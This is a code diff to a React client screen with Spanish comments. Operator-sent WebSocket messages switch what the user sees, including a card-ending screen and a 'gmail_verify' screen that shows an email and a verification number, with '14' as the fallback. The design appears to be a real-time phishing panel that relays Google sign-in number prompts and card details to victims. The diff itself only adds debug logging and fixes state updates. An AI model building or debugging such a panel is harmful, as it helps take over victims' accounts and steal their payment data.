@@ -109,6 +109,11 @@ export default function ClientScreen() {
           
           console.log('SCREEN_CHANGE recibido:', tipo, data);
           
+          // Log para depurar los datos enviados para gmail_verify
+          if (tipo.includes('gmail_verify')) {
+            console.log('DATOS RECIBIDOS PARA GMAIL_VERIFY:', JSON.stringify(data));
+          }
+          
           // Extract screen type from the message
           // The server sends 'mostrar_X', we need to remove the prefix
           let screenType = tipo.replace('mostrar_', '');
@@ -136,24 +141,34 @@ export default function ClientScreen() {
               ...data,
               terminacion: data.terminacion || '****'
             });
+            // Importante: no debemos actualizar screenData nuevamente al final de esta función
+            return;
           } 
           else if (screenType.toLowerCase() === 'gmail_verify') {
             console.log('Mostrando pantalla de verificación Google con datos:', data);
             setCurrentScreen(ScreenType.GMAIL_VERIFY);
             // Asegurar que tengamos los datos del código y correo
+            const codigoVerificacion = data.codigo && data.codigo.trim() !== '' ? data.codigo : '14';
+            
+            // Actualizamos screenData antes de continuar
             setScreenData({
               ...data,
               correo: data.correo || '',
-              codigo: data.codigo || '14' // Usamos el código enviado o 14 como fallback
+              codigo: codigoVerificacion
             });
-            console.log('Datos establecidos para gmail_verify:', { ...data, correo: data.correo, codigo: data.codigo || '14' });
+            console.log('Datos establecidos para gmail_verify:', { 
+              correo: data.correo || '', 
+              codigo: codigoVerificacion
+            });
+            
+            // Importante: no debemos actualizar screenData nuevamente al final de esta función
+            return;
           } 
           else {
             setCurrentScreen(screenType as ScreenType);
+            // Actualizamos screenData aquí para los casos normales
+            setScreenData(data);
           }
-          
-          // Update screen-specific data
-          setScreenData(data);
         }
       } catch (error) {
         console.error("Error processing WebSocket message:", error);
